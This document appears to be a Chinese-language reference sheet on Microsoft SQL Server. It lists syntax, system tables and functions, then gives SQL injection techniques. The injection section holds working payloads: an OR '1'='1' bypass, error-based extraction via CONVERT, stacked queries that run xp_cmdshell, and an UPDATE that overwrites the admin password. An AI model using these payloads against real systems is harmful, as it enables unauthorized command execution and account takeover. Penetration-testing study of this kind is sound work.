# Microsoft SQL Server (MSSQL)

## 基本信息

- 微软商业数据库
- 默认端口：1433
- 注释符：`--`（单行）、`/**/`（多行）
- 字符串连接符：`+`
- 字符串定界符：单引号 `'`

## 连接与基本操作

```sql
-- 查看版本
SELECT @@version;

-- 查当前数据库
SELECT DB_NAME();

-- 查当前用户
SELECT SYSTEM_USER;
SELECT USER;
SELECT CURRENT_USER;

-- 查主机名
SELECT HOST_NAME();
SELECT @@servername;
```

## 查询系统信息

```sql
-- 列出所有数据库
SELECT name FROM master..sysdatabases;
SELECT name FROM sys.databases;
EXEC sp_databases;

-- 列出当前库的所有表
SELECT name FROM sysobjects WHERE xtype='U';
SELECT table_name FROM information_schema.tables;

-- 列出表中所有列
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users');
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- 查看用户/登录
SELECT name FROM sysusers;
SELECT name FROM master..syslogins;
```

## 常用函数

### 字符串操作

```sql
-- 取子字符串
SELECT SUBSTRING('hello', 1, 2);       -- 'he'

-- 字符串长度
SELECT LEN('hello');                    -- 5
SELECT DATALENGTH('hello');             -- 5（字节长度）

-- 字符串连接
SELECT 'a' + 'b';                       -- 'ab'
SELECT CONCAT('a', 'b');                -- 'ab'（2012+）

-- 大小写
SELECT UPPER('hello');                  -- 'HELLO'
SELECT LOWER('HELLO');                  -- 'hello'

-- 查找
SELECT CHARINDEX('ll', 'hello');        -- 3
SELECT PATINDEX('%ll%', 'hello');       -- 3（支持通配符）
```

### 类型转换

```sql
SELECT CAST('123' AS int);
SELECT CONVERT(int, '123');
```

### 时间与延迟

```sql
-- 延迟（MSSQL 特有语法）
WAITFOR DELAY '00:00:10';              -- 延迟 10 秒
WAITFOR TIME '15:30:00';               -- 等到指定时间

-- 条件延迟
IF (1=1) WAITFOR DELAY '00:00:05'
```

### 条件表达式

```sql
SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END;
SELECT IIF(1=1, 'yes', 'no');           -- 2012+ 简写
```

## SQL 注入相关特性

### 注入点探测

```sql
-- MSSQL 指纹
' + @@version + '                     -- 利用 + 连接符

-- 行限制
SELECT TOP 1 * FROM users;             -- TOP 而不是 LIMIT

-- 注释
' OR '1'='1' --
```

### 信息搜集（sysobjects / syscolumns）

```sql
-- MSSQL 传统方式（不需要 information_schema）
SELECT name FROM sysobjects WHERE xtype='U'   -- 所有用户表
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')  -- 列名

-- information_schema 方式（2005+）
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### TOP 与 OFFSET FETCH

```sql
-- 限制行数（没有 LIMIT）
SELECT TOP 1 * FROM users;

-- 2012+ 支持
SELECT * FROM users ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

### 报错注入

```sql
-- CONVERT / CAST 类型转换报错
' AND 1=CONVERT(int, (SELECT @@version))--

-- 子查询超过 1 行报错
' AND 1=(SELECT TOP 1 column FROM (SELECT TOP 1 column FROM users ORDER BY 1) sq ORDER BY 1 DESC)--
```

### 多语句与扩展存储过程

MSSQL 默认支持多语句（`;` 分隔），这是最危险的特性之一：

```sql
-- 多语句执行
'; SELECT * FROM users; --
'; EXEC master..xp_cmdshell 'whoami'; --
```

### 高危扩展存储过程（需高权限）

```sql
-- 命令执行
EXEC xp_cmdshell 'whoami';

-- 注册表操作
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\...';

-- 文件操作
EXEC sp_readerrorlog;
```

### 堆叠查询（Stacked Queries）

MSSQL + PHP/ASP.NET 常支持堆叠查询，可以在一条语句中执行多个查询：

```sql
-- 场景：INSERT 注入
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

## 与其他数据库的关键区别

| 特性 | MSSQL | PostgreSQL | MySQL | Oracle |
|------|-------|-----------|-------|--------|
| 行限制 | `TOP n` | `LIMIT n` | `LIMIT n` | `ROWNUM` |
| 字符串连接 | `+` | `\|\|` | `CONCAT()` | `\|\|` |
| 延迟 | `WAITFOR DELAY` | `pg_sleep()` | `SLEEP()` | `DBMS_PIPE.RECEIVE_MESSAGE()` |
| 多语句 | 默认支持 | 依赖驱动 | 依赖驱动 | 不支持 |
| 命令执行 | `xp_cmdshell` | `COPY ... PROGRAM` | `sys_exec()` (UDF) | 外部脚本 |
| 系统表 | `sysobjects`/`syscolumns` | `pg_catalog` | `information_schema` | `all_tables` |
| 取子串 | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()`/`MID()` | `SUBSTR()` |
| 长度函数 | `LEN()` | `LENGTH()` | `LENGTH()` | `LENGTH()` |
| 条件函数 | `IIF()`/`CASE` | `CASE` | `IF()`/`CASE` | `CASE`/`DECODE()` |
